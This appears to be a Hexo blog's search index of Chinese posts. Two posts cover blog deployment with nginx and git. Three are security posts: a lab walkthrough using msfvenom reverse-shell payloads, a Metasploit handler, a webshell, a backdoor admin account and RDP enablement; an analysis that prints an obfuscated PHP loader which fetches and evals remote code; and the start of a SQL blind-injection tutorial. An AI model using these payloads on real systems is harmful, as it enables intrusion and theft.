<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[hexo从github移动到centos个人服务器]]></title>
    <url>%2F2018%2F08%2F09%2Fhexo%E4%BB%8Egithub%E7%A7%BB%E5%8A%A8%E5%88%B0centos%E4%B8%AA%E4%BA%BA%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
    <content type="text"><![CDATA[配置nginx，将http 301重定向到https， 前期安装首先由于nginx的一些模块依赖一些lib库，所以在安装nginx之前，必须先安装这些lib库1yum install -y pcre pcre-devel openssl openssl-devel zlib zlib-devel 以及下面的gcc make wget等12yum -y install wgetyum install -y gcc gcc-c++ make http://nginx.org/en/download.html 这里有nginx各个版本的下载地址 创建一个目录12mkdir /hexocd /hexo 下载nginx包1wget http://nginx.org/download/nginx-1.14.0.tar.gz 解压安装1234tar -zxvf nginx-1.14.0.tar.gzcd nginx-1.14.0./configure --prefix=/hexo/nginx/ --with-http_ssl_module --with-http_realip_module --with-http_stub_status_module --with-debugmake &amp;&amp; make install &amp;&amp; echo "ok" yum -y install git #安装gitadduser git #创建一个git用户，用来与虚拟git服务 创建裸仓：创建证书登录将本地用户的公钥id_rsa.pub导入到/home/git/.ssh/authorized_keys文件里面在导入之前，并没有.ssh这个文件以及authorized_keys这个文件所以先敲一下命令建立12cd /home/gitmkdir .ssh 创建一个新文件1vim authorized_keys 公钥文件本地地址：windows用户：本地用户公钥文件在c:/users/用户/.ssh/里面 这里的/好像写反了由于我使用的是linux系统，linux公钥文件在/home/xxx/.ssh/id_rsa.pub里面linux用户直接输入cat /home/anjing/.ssh/id_rsa.pub 可查看到将内容复制到服务器的authorized_keys即可 建立git仓库：由于服务器上没有git仓库，所以我们先建立一个 选择一个目录作为git仓库12cd /home/gitgit init --bare hexo.git Git就会创建一个裸仓库，裸仓库没有工作区，因为服务器上的Git仓库纯粹是为了共享，所以不让用户直接登录到服务器上去改工作区，并且服务器上的Git仓库通常都以.git结尾。然后，把owner改为git如果提示图片上的内容表示创建成功接着更改权限1chown -R git:git hexo.git 禁用shell登录：vim /etc/passwd找到类似下面这行1git:x:1001:1001::/home/git:/bin/bash 将他修改为1git:x:1001:1001::/home/git:/bin/bash/git-shell 就是在最后面加上git-shell就行了，这样，git用户可以正常通过ssh使用git，但是无法登录shell 配置nginx刚刚将nginx安装到了/hexo/nginx 里面 1vim /hexo/nginx/conf/nginx.conf 首先将证书上传，如何获取证书自己百度或谷歌找找，这里我们只谈怎么配置 可以将里面的配置都删除，使用我下面的配置，默认使用了https，如果不需要可以自己删除443段和跳转12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485user git;worker_processes auto;pid logs/nginx.pid;worker_rlimit_nofile 10240;events &#123; use epoll; worker_connections 10240; multi_accept on; &#125;http &#123; include mime.types; default_type application/octet-stream; server_tokens off; client_header_buffer_size 32k; large_client_header_buffers 4 32k; sendfile on; keepalive_timeout 65; fastcgi_intercept_errors on; tcp_nodelay on; fastcgi_connect_timeout 300; fastcgi_send_timeout 300; fastcgi_read_timeout 300; fastcgi_buffer_size 64k; fastcgi_buffers 4 64k; fastcgi_busy_buffers_size 128k; fastcgi_temp_file_write_size 256k; gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_http_version 1.1; gzip_comp_level 2; gzip_types text/plain application/javascript application/x-javascript text/javascript text/css application/xml application/xml+rss; gzip_vary on; gzip_proxied expired no-cache no-store private auth; gzip_disable "MSIE [1-6]\."; server &#123; listen 80; server_name smelond.com; if ($scheme = http ) &#123; return 301 https://$host$request_uri; &#125; &#125; server &#123; listen 443; server_name smelond.com; ssl on; ssl_certificate /hexo/nginx/ssl/fullchain.pem; ssl_certificate_key /hexo/nginx/ssl/private.key; ssl_protocols TLSv1 TLSv1.1 TLSv1.2 SSLv3; ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH; ssl_prefer_server_ciphers on; root /home/git; index index.html index.htm; location ~ .*\.(ico|gif|jpg|jpeg|png|bmp|swf)$ &#123; access_log off; expires 1d; &#125; location ~ .*\.(js|css|txt|xml)?$ &#123; access_log off; expires 12h; &#125; location / &#123; try_files $uri $uri/ =404; &#125; access_log /hexo/nginx/logs/access_log.log; error_log /hexo/nginx/logs/error_log.log; &#125;&#125; 完成后可以启动nginx123/hexo/nginx/sbin/nginx -s reload # 启动nginx/hexo/nginx/sbin/nginx -s stop # 停止nginx/hexo/nginx/sbin/nginx -t # 检查配置文件是否正确 如出现报错，可以执行下面语句，然后重新启动nginx1/hexo/nginx/sbin/nginx -c /hexo/nginx/conf/nginx.conf 自动部署在第上一步中建立的裸仓中（hexo.git目录），找到hooks目录下的post-update.sample,将他重命名为post-update12cd /home/git/hexo.git/hooks/mv post-update.sample post-update 然后用vim打开post-update添加下面内容：1git --work-tree=/home/git --git-dir=/home/git/hexo.git checkout -f 123456789#!/bin/shgit --work-tree=/home/git --git-dir=/home/git/hexo.git checkout -f #添加到#!/bin/sh下面这行即可## An example hook script to prepare a packed repository for use over# dumb transports.## To enable this hook, rename this file to "post-update".exec git update-server-info 接下来在本地的hexo项目中，编辑_config.yml，需要修改deploy，只需要将repo后面的域名修改为你的服务器地址(如果ssh端口已经修改，请看踩坑部分)1234deploy: type: git repo: git@smelond.com:/home/git/hexo.git branch: master 接着安装hexo-deployer-git1sudo npm install hexo-deployer-git --save 完成后就可以执行了1234hexo new ""hexo cleanhexo ghexo d 踩坑最后 献上一个巨大的坑如果遇到类似以上问题，可能是你的ssh登录端口 不为默认的22解决方法：在_config.yml配置文件中将 git@smelond.com:/home/git/hexo.git 修改为 ssh://git@smelond.com:端口号/home/git/hexo.git1234deploy: type: git repo: ssh://git@smelond.com:9999/home/git/hexo.git #9999为你的ssh端口号 branch: master 参考：https://segmentfault.com/a/1190000005723321https://blog.csdn.net/pop1586082213/article/details/54576131https://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/00137583770360579bc4b458f044ce7afed3df579123eca000]]></content>
      <categories>
        <category>linux</category>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>linux</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo从windows搬家到deepin]]></title>
    <url>%2F2018%2F06%2F21%2Fhexo%E4%BB%8Ewindows%E6%90%AC%E5%AE%B6%E5%88%B0deepin%2F</url>
    <content type="text"><![CDATA[安装需要的软件git 客户端：1sudo apt-get install git node.js:12sudo apt-get install -y nodejssudo apt-get install -y build-essential npm:1sudo apt-get install -y npm 完成之后可以使用-v命令来查看是否安装成功1234anjing@anjing-PC:~$ node -vv6.3.1anjing@anjing-PC:~$ npm -v4.4.2 添加新秘钥查看秘钥是否添加123456anjing@anjing-PC:~$ ssh -T git@github.comThe authenticity of host 'github.com (13.229.188.59)' can't be established.RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'github.com,13.229.188.59' (RSA) to the list of known hosts.Permission denied (publickey). 看到提示Permission denied (publickey).那就是秘钥有问题咯 创建秘钥1ssh-keygen -t rsa -C "你的邮箱地址" 接着敲３次回车，完成之后在/home/xxx/.ssh/下面可以看到秘钥 查看秘钥1cat /home/xxx/.ssh/id_rsa.pub 上传秘钥点击：头像 -&gt; settings -&gt; SSH and GPG keys 接着将以前的秘钥Delete删除然后点击上方的New SSH key Title处随便填写一个名字Key 处将/home/xxx/.ssh/id_rsa.pub里面的内容复制到里面接着点击Add SSH key 然后重新输入：12anjing@anjing-PC:~$ ssh -T git@github.comHi smelond! You've successfully authenticated, but GitHub does not provide shell access. 可以看到已经成功了 配置用户名和邮箱123git config --global user.name "用户名"git config --global user.email "邮箱" 将源文件拷贝到目录由于我的盘符没有全部分化为ext4格式，我留了40Ｇ的空间出来作为ntfs，所以我将我的文件拷贝到挂载的目录/media/anjing/0007C530000C7583/blog，我已经将我的hexo里面的目录和文件移动到了这里deepin会默认会自动挂载我ntfs格式的盘符需要拷贝文件和目录有：123456_config.ymlpackage.jsonnode_modulesscaffoldssourcethemes 上面是hexo的核心文件 查看一下：12anjing@anjing-PC:/media/anjing/0007C530000C7583/blog$ ls_config.yml node_modules package.json scaffolds source themes 可以看到我已经拷贝过来了 安装hexo打开终端输入1npm install hexo-cli -g 结果提示：1234567891011121314151617181920212223npm WARN checkPermissions Missing write access to /usr/lib/node_modules/usr/lib└─┬ hexo-cli@1.1.0 ....................省略npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@^1.0.0 (node_modules/hexo-cli/node_modules/chokidar/node_modules/fsevents):npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted &#123;"os":"darwin","arch":"any"&#125; (current: &#123;"os":"linux","arch":"x64"&#125;)npm ERR! path /usr/lib/node_modulesnpm ERR! code EACCESnpm ERR! errno -13npm ERR! syscall accessnpm ERR! Error: EACCES: permission denied, access '/usr/lib/node_modules'npm ERR! at Error (native)npm ERR! &#123; Error: EACCES: permission denied, access '/usr/lib/node_modules'npm ERR! at Error (native)npm ERR! errno: -13,npm ERR! code: 'EACCES',npm ERR! syscall: 'access',npm ERR! path: '/usr/lib/node_modules' &#125;npm ERR! npm ERR! Please try running this command again as root/Administrator.npm ERR! A complete log of this run can be found in:npm ERR! /home/anjing/.npm/_logs/2018-06-21T12_07_44_418Z-debug.log 如果这里出现问题就使用sudo安装1sudo npm install hexo-cli -g 提示消息：123456/usr/bin/hexo -&gt; /usr/lib/node_modules/hexo-cli/bin/hexo/usr/lib└─┬ hexo-cli@1.1.0 .....................省略npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@^1.0.0 (node_modules/hexo-cli/node_modules/chokidar/node_modules/fsevents):npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted &#123;"os":"darwin","arch":"any"&#125; (current: &#123;"os":"linux","arch":"x64"&#125;) 看到报错npm WARN 但是这里不要惊慌，出现WARN没什么问题，只要不出npm ERR!就行了 安装相关模块12345npm installnpm install hexo-deployer-git --save // 文章部署到 git 的模块（下面为选择安装）npm install hexo-generator-feed --save // 建立 RSS 订阅npm install hexo-generator-sitemap --save // 建立站点地图 安装上面的模块可能会出现下面错误，不用管即可12npm WARN optional SKIPPING OPTIONAL DEPENDENCY: fsevents@^1.0.0 (node_modules/chokidar/node_modules/fsevents):npm WARN notsup SKIPPING OPTIONAL DEPENDENCY: Unsupported platform for fsevents@1.2.4: wanted &#123;"os":"darwin","arch":"any"&#125; (current: &#123;"os":"linux","arch":"x64"&#125;) 测试hexo完成以后一定要在本地测试好 首先我们新建一片文章：1hexo new "test" 接着编辑一下： 保存后部署本地发布123hexo clean //清除缓存hexo generate //生成静态文件hexo server //本地启动服务 可以看到在本地已经发布成功了 部署到github上部署之前需要先修改hexo配置文件打开_config.yml找到12345deploy: type: git # repo: https://github.com/smelond/smelond.github.io.git //将这个注释 repo: git@github.com:smelond/smelond.github.io.git //修改为这个 branch: master 如果不修改上面的内容可能部署会显示等其他错误：12Username for 'https://github.com': Password for 'https://smelond@github.com': 解决到上面的问题，就可以开始部署了 部署123hexo clean //清除缓存hexo generate //生成静态文件hexo deploy //部署网站到设定的仓库 小小的提示：在hexo deploy 可能会卡５分钟左右1234567anjing@anjing-PC:/media/anjing/0007C530000C7583/blog$ hexo dINFO Deploying: gitINFO Clearing .deploy_git folder...INFO Copying files from public folder...INFO Copying files from extend dirs...[master fdb7ea5] Site updated: 2018-06-21 20:42:26 1 file changed, 1 insertion(+), 1 deletion(-) //在这个位置可能会卡主不动５分钟左右 等带几分钟后会提示：123To github.com:smelond/smelond.github.io.git + b66a43b...fdb7ea5 HEAD -&gt; master (forced update)分支 master 设置为跟踪来自 git@github.com:smelond/smelond.github.io.git 的远程分支 master。 提示上面的内容表示已经推送到github上了接着打开博客看一下： 其他问题：如果部署网站到设定的仓库出现：12345678anjing@anjing-PC:/media/anjing/0007C530000C7583/blog$ hexo dINFO Deploying: gitINFO Clearing .deploy_git folder...INFO Copying files from public folder...INFO Copying files from extend dirs...[master 5de89e9] Site updated: 2018-06-21 20:31:16 1 file changed, 1 insertion(+), 1 deletion(-)Warning: Permanently added the RSA host key for IP address '13.250.177.223' to the list of known hosts. 如果出现这条Warning就将/home/xxx/.ssh/下的id_rsa.pub 和 id_rsa删除12rm -rf /home/xxx/.ssh/id_rsa.pubrm -rf /home/xxx/.ssh/id_rsa 然后重新创建上传秘钥即可 参考：https://blog.csdn.net/lvonve/article/details/79587321https://blog.csdn.net/Greenovia/article/details/60576985]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>linux</tag>
        <tag>deepin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站提权之MSF骚操作]]></title>
    <url>%2F2018%2F04%2F20%2F%E7%BD%91%E7%AB%99%E6%8F%90%E6%9D%83%E4%B9%8BMSF%E9%AA%9A%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[测试环境： 内网，没钱买服务器，而且还拿不到站，尴尬的事情😭 攻击者：parrotos 这个系统跟kali差不多 服务器：windows2003 那么，我们现在先来看看使用msfvenom如何生成payload msfvenom这个是一个什么东西就不用说了吧，玩过metasploit的都知道（表示我还是一个新手！！！），当然没玩过的自行谷歌，已经很多大佬跟我说过这个是渗透测试最基本的东西 在freebuf上面看到msfvenom命令行选项的中文翻译，我直接搬过来了，不犯法吧，哈哈哈！！！ msfvenom命令行选项Options:12345678910111213141516171819-p, --payload &lt;payload&gt; 指定需要使用的payload(攻击载荷)。如果需要使用自定义的payload，请使用&apos;-&apos;或者stdin指定-l, --list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all-n, --nopsled &lt;length&gt; 为payload预先指定一个NOP滑动长度-f, --format &lt;format&gt; 指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)-e, --encoder [encoder] 指定需要使用的encoder（编码器）-a, --arch &lt;architecture&gt; 指定payload的目标架构 --platform &lt;platform&gt; 指定payload的目标平台-s, --space &lt;length&gt; 设定有效攻击载荷的最大长度-b, --bad-chars &lt;list&gt; 设定规避字符集，比如: &apos;\x00\xff&apos;-i, --iterations &lt;count&gt; 指定payload的编码次数-c, --add-code &lt;path&gt; 指定一个附加的win32 shellcode文件-x, --template &lt;path&gt; 指定一个自定义的可执行文件作为模板-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行 --payload-options 列举payload的标准选项-o, --out &lt;path&gt; 保存payload-v, --var-name &lt;name&gt; 指定一个自定义的变量，以确定输出格式 --shellest 最小化生成payload-h, --help 查看帮助选项 --help-formats 查看msf支持的输出格式列表 生成payload生成payload，有有两个必须的选项：-p -f使用-p 来指定要使用的payload。可以使用下面的命令来查看所有msf可用的payload列表1./msfvenom -l payloads -p选项也支持使用使用自定义的payload，需要使用 “-“，比如:1cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw 使用-f 来指定payload的输出格式举例：1./msfvenom -p windows/meterpreter/bind_tcp -f exe 使用下面的命令，可以产看msf支持的输出格式1./msfvenom --help-formats 一个典型的msfvenom使用举例如下：1$ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&apos;s IP] lport=4444 -f exe -o /tmp/my_payload.exe 使用自定义可执行文件模板默认的，msfvenom使用的模板文件保存在msf/data/templates目录中，如果你想使用你自己的模板文件，你可以使用-x选项来指定，比如：1./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe 这个命令将使用windows下计算器程序（calc.exe）作为可执行文件的模板生成payload。注意：如果你想要创建一个windows的x64的可执行文件模板来生成一个x64的payload，你只能使用exe格式的模板。使用-x选项经常和-k选项配合使用，-k选项会将你的payload作为一个新的进程运行。但目前这个选项只支持老版本的windows系统比如windows xp MSF Payloads生成攻击载荷 Linux下反弹Meterpreter shell1msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP Address&gt; LPORT=&lt;your port to connect on&gt; -e -f elf -a x86 --platform linux -o shell C反弹shell（C shellcode）1msfvenom -p windows/shell_reverse_tcp LHOST=&lt;your IP Address&gt; LPORT=&lt;your port to connect on&gt; -b &quot;\x00\x0a\x0d&quot; -a x86 --platform win -f c Python反弹shell1msfvenom -p cmd/unix/reverse_python LHOST=&lt;your IP Address&gt; LPORT=&lt;your port to connect on&gt; -o shell.py Asp反弹shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp Bash反弹shell1msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.sh PHP反弹shell1msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw -o shell.php Windows反弹shell1msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe 上面是一些msfvenom可以生成的攻击载荷 因为我们的需要提权网站是php的，所以就需要生成php载荷 开始我们的表演接下来全是一些瞎操作😂 将php大马上传到服务器我这里已经上传成功了但是执行whomai，net user命令没有回显，那证明权限不够，所以我们拿着msf来提权接着打开parrotos系统，这个系统叫做“鹦鹉”，跟kali差不多，感兴趣的自行谷歌执行命令生成攻击载荷：1msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.32.129 LPORT=3333 -f raw -o shell.php shell.php这个载荷已经生成好了，生成好了的文件在当前目录，现在我们将它上传到服务器已经成功上传，当然，光这样是不够的，现在切换到parrotos虚拟机系统我们需要去执行一些漏洞利用模块在命令行窗口输入msfconsole就可以进入metasploit了12345678┌─[root@parrot]─[~]└──╼ # msfconsole //输入这条命令msf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp //设置payloadmsf exploit(multi/handler) &gt; show options //显示选项msf exploit(multi/handler) &gt; set LHOST 192.168.32.129 //设置ip地址，注意，这个要与上面攻击载荷里面的相同msf exploit(multi/handler) &gt; set LPORT 3333 //设置端口，这个也要相同msf exploit(multi/handler) &gt; exploit //执行攻击 现在parrotos系统这边正在监听中，我们现在只需要去执行我们上传的php文件，在任意系统中打开那个shell.php网页即可触发看到 meterpreter&gt; 就已经反弹了一个shell了，接着输入直接输入getuid123meterpreter &gt; getuid Server username: Administrator (0) //看到这个地方是administrator就成功了，我们已经有了超级管理员权限了meterpreter &gt; 直接输入shell可以进入bash终端1234567meterpreter &gt; shellProcess 660 created.Channel 0 created.Microsoft Windows [�汾 5.2.3790](C) ��Ȩ���� 1985-2003 Microsoft Corp.C:\phpStudy\WWW\webpentest\varcov&gt; 记录这个位置C:\phpStudy\WWW\webpentest\varcov&gt;没搞懂为什么在输入shell后执行net user类似的命令为什么会断开连接，有哪位大佬看到是否可以帮忙解释一下1234Terminate channel 0? [y/N] y[-] Error running command shell: Rex::TimeoutError Operation timed out.meterpreter &gt; [*] 192.168.32.143 - Meterpreter session 2 closed. Reason: Died 看到上面出问题了，难道没戏了吗，当然不是了，meterpreter&gt;那个界面的功能已经够我们用了 由于我的php大马支持cmd命令执行，果断的从新生成了一个exe文件，上传到服务器1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.32.129 LPORT=4444 -f exe -a x86 --platform win -o shell.exe 生成了shell.exe，现在试着用其他方法上传到服务器，我们在执行一次php文件，然后parrotos系统这边又监听到了一个会话，直接连接进去接着直接upload上传文件即可12345678[*] Started reverse TCP handler on 192.168.32.129:3333 [*] Sending stage (37543 bytes) to 192.168.32.143[*] Meterpreter session 4 opened (192.168.32.129:3333 -&gt; 192.168.32.143:1096) at 2018-04-20 21:18:56 +0800 //重新连接成功meterpreter &gt; upload shell.exe C:\\phpStudy\\WWW\\webpentest\\varcov\ //这个位置上面已经说到过，上传到这个位置即可[*] uploading : shell.exe -&gt; C:\phpStudy\WWW\webpentest\varcov\[*] uploaded : shell.exe -&gt; C:\phpStudy\WWW\webpentest\varcov\\shell.exemeterpreter &gt; ok，上传成功，因为生成的exe文件是用的一个新端口，并且payload是windows/meterpereter/reverse_tcp，所以返回重新设置即可12345msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lport 4444lport =&gt; 4444msf exploit(multi/handler) &gt; exploit //执行 完成上面操作后，来到php大马在命令执行中写入路径即可C:\phpStudy\WWW\webpentest\varcov\shell.exe由于是windows系统，所以注意斜杠问题，windows的是反斜杠”\” 接着提权：12345678910111213141516171819202122232425262728293031323334353637383940414243444546meterpreter &gt; getuidServer username: AA-C86AD57B48D6\Administrator //看到这个位置的administrator跟上面php得的不一样，感觉那个可能是一个假的权限meterpreter &gt; shell //进入bash终端Process 3300 created.Channel 1 created.Microsoft Windows [�汾 5.2.3790](C) ��Ȩ���� 1985-2003 Microsoft Corp.C:\phpStudy\WWW\webpentest\varcov&gt;net user //执行net user命令没有发现admin用户net user\\AA-C86AD57B48D6 ���û��ʻ�-------------------------------------------------------------------------------Administrator ASPNET Guest IUSR_AA-C86AD57B48D6 IWAM_AA-C86AD57B48D6 SUPPORT_388945a0 �����ɹ����ɡ�C:\phpStudy\WWW\webpentest\varcov&gt;net user admin admin /add //创建一个admin用户net user admin admin /add�����ɹ����ɡ�C:\phpStudy\WWW\webpentest\varcov&gt;net localgroup administrators admin /add //提权net localgroup administrators admin /add�����ɹ����ɡ�C:\phpStudy\WWW\webpentest\varcov&gt;net user admin //admin用户的信息net user admin�û��� admin此处省略��������Ա *Administrators *Users //看到这个地方有Administrator用户组就成功了C:\phpStudy\WWW\webpentest\varcov&gt;exit //退出bash终端exit//权限有了，3389没开，我直接用这个开吧！！！meterpreter &gt; run getgui -e //开启3389端口[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.[!] Example: run post/windows/manage/enable_rdp OPTION=value [...][*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator[*] Carlos Perez carlos_perez@darkoperator.com[*] Enabling Remote Desktop[*] RDP is disabled; enabling it ...[*] Setting Terminal Services service startup mode[*] The Terminal Services service is not set to auto, changing it to auto ...[*] Opening port in local firewall if necessary[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20180420.5422.rcmeterpreter &gt; 3389端口也已经开启了，接下来拿我们的win10去连接即可 大概就这么多了吧，下次有时间写一个metasploit的使用，这个框架还是比较牛逼的]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP大马后门分析]]></title>
    <url>%2F2018%2F04%2F11%2FPHP%E5%A4%A7%E9%A9%AC%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[当然，这个大马是能用的，过了几天，我就开始研究起来了这个大马 解决编码问题那么，notepad++打开（我只有这个哈），发现代码使用chr()进行编码，chr是php的一个函数，他从不同的 ASCII 值返回字符，刚好，我这里的chr都是包裹着ascii码的，编码方式也知道我还是把大马内容拿出来吧：12345678910111213141516171819&lt;?php$admin['check'] = false;$password = 'admin';//设置密码$c = "chr";session_start();if (empty($_SESSION['PhpCode'])) &#123; $url = $c(104).$c(116).$c(116).$c(112).$c(58).$c(47).$c(47); $url .= $c(119).$c(119).$c(119).$c(46).$c(97).$c(52).$c(52); $url .= $c(57).$c(52).$c(52).$c(46).$c(99).$c(111).$c(109).$c(47); $url .= $c(112).$c(104).$c(112).$c(46).$c(106).$c(112).$c(103); $get = chr(102) . chr(105) . chr(108) . chr(101) . chr(95); $get .= chr(103) . chr(101) . chr(116) . chr(95) . chr(99); $get .= chr(111) . chr(110) . chr(116) . chr(101) . chr(110); $get .= chr(116) . chr(115); $_SESSION['PhpCode'] = $get($url);&#125;$unzip = $c(103) . $c(122) . $c(105) . $c(110);$unzip .= $c(102) . $c(108) . $c(97) . $c(116) . $c(101);@eval($unzip($_SESSION['PhpCode'])); 细心一点的同学会发现问题，这个php代码最后一排怎么少了?&gt; 符号呢？那么我们来慢慢开始读代码，看到那个$c = “chr”;然后下面有一个：session_start(); 当然，这个我也不太知道是干嘛用的，毕竟不会php，好像是启动会话，Session 的工作机制是：为每个访问者创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，亦或通过 URL 进行传导。他可以存储和取回session变量，具体大家还是百度一下这个吧。接下来，一个if语句，判断这个是否有取回的session变量，当然，执行到这一步，并没有后面那个phpcode，所以直接执行if语句c=chr，拿出我们的ascii表对应，发现104=h，116=t，那就不用猜了，这应该是一个网址，接着，为了能马上得出结果，打开pycharm写了一个正则加for循环的代码，一共大概6行代码，然后直接将后面的内容翻译出来了，123456import restring = "$c(104).$c(116).$c(116).$c(112).$c(58).$c(47).$c(47)$c(119).$c(119).$c(119).$c(46).$c(97).$c(52).$c(52);$c(57)" \ ".$c(52).$c(52).$c(46).$c(99).$c(111).$c(109).$c(47);$c(112).$c(104).$c(112).$c(46).$c(106).$c(112).$c(103);"result = re.findall(r'(\w*[0-9]+\w*)', string)for line in result: print(chr(int(line)), end="") 大概就这样吧，输出结果：http://www.a44944.com/php.jpg， 没错，的确是一个网址，我们连接的是一张图片那他是怎么连接的呢我把$get和$unzip里面的内容拿去python里面运行了一下，$get=file_get_contents函数,$unzip=gzinflate函数$_SESSION[‘PhpCode’] = $get($url);就成了$_SESSION[‘PhpCode’] = file_get_contents(http://www.a44944.com/php.jpg);最后一排的gzinflate函数就去解压前面的内容，好像他们是字符串，所以用eval去执行，就是这样，我们理解了原理，难怪它只有这么几行代码 查看图片内容网址有了，打开浏览器，去地址栏访问这个网址，没错，是一样损坏了的图片，这就基本的肯定了这个图片里面有我们想要的内容，应该就是php代码吧，我直接将图片下载下来，用notepad++打开，结果乱码，改为txt文件，还是乱码想起来好像他这个在我们连接时使用了gzinflate函数进行解压，所以他应该是被压缩了的，为了能够看着很方便我直接从新写了一个php123456&lt;?phpsession_start();$url = "http://127.0.0.1/webpentest/upload/upload/php.jpg"; //这里我将这个图片下载下来了的，所以连接的本地的$get = "file_get_contents";$_SESSION['PhpCode'] = $get($url);echo(gzinflate($_SESSION['PhpCode'])); 直接去连接，但是不执行了eval了，直接用echo输出，看到前面的$_SESSION产生了一个会话，成功后用gzinflate去解压，用echo输出结果，我们要的代码就这样出来了，但是代码出来后发现很奇怪，前面几行没问题，但是发现后面又全是乱码又要慢慢开始读代码了，太乱了，按了ctrl+u，查看源代码一打开，就看到了这句：1e'.'v'.'a'.'l(g'.'z'.'un'.'co'.'mp'.'re'.'ss(bas'.'e64_'.'deco'.'de(\'eJzs/fl7HNd1J4z/TD+...... 又了eval，随便瞄了一眼后面的函数，又了拼接，主要就是看到了base64_decode，原来是base64加密，果断的将eval改为了echo，发现不能输出，纳闷了，怎么不行，又开始找原因试了试将所有代码全部保存出来，接着用解密代码试试能不能解出base6412345678910&lt;?php$Code = '这个地方放base64_decode加密的代码';$File = 'decoded.php';//解码后保存的文件$Temp = base64_decode($Code);$temp = gzuncompress($Temp);$FP = fopen($File,"w");fwrite($FP,$temp);fclose($FP);echo"解密成功！";?&gt; 当然，我毫不犹豫的将乱码复制到了这个里面，看到当前目录新增了一个文件，这回对了，应该出来了，打开一看，php大马内容呈现出来了，大概就这么多吧，没什么技术含量，但是要细心，不懂的马上谷歌百度，比如我在中途就将gzuncompress看成了gzinflate函数，然后导致中途出现了很多意外，接下来我就开始了慢慢找这个php大马里面是否还有后门了，毕竟现在黑吃黑真的不少，没人愿意将自己写了几个小时，甚至几天的马随便扔出来给其他人用。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>PHP大马</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入之盲注攻击]]></title>
    <url>%2F2018%2F04%2F04%2Fsql%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[在我们学习盲注时，需要注意的事情是盲注基于true和false，即0和1，真返回1，假返回0一个简单的小测试，数据库是sqlin，我们来判断数据库字符返回值是否为0或1：12345678910111213141516171819202122232425262728293031mysql&gt; select mid(database(),1,1)='s';+-------------------------+| mid(database(),1,1)='s' |+-------------------------+| 1 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select mid(database(),1,1)='r';+-------------------------+| mid(database(),1,1)='r' |+-------------------------+| 0 |+-------------------------+1 row in set (0.00 sec)mysql&gt; select database() regexp '^[a-z]';+----------------------------+| database() regexp '^[a-z]' |+----------------------------+| 1 |+----------------------------+1 row in set (0.00 sec)mysql&gt; select database() regexp '^[1-10]';+-----------------------------+| database() regexp '^[1-10]' |+-----------------------------+| 0 |+-----------------------------+1 row in set (0.00 sec) 常用的盲注函数 if 条件为真执行，反之不执行点击跳转 if(条件,执行(true),不执行(false)) sleep 执行延时number秒点击跳转 sleep(number) length 统计字符串的长度点击跳转 length(number) mid,substr 截取字符串的一部分点击跳转 mid(字段,起始位置(number),长度(number)) ORD 返回第一个字符串的ASCII码点击跳转 ord(x) left 得到字符串左部指定个数的字符点击跳转 left(string,number) regexp 正则注入点击跳转 regexp ‘^[a-z]’ 判断一个表的第一个字符串是否在a-z中 regexp ‘^r’ 判断第一个字符串是否为r regexp ‘^r[a-z]’ 判断一个表的第二个字符串是否在a-z中 like 匹配注入点击跳转 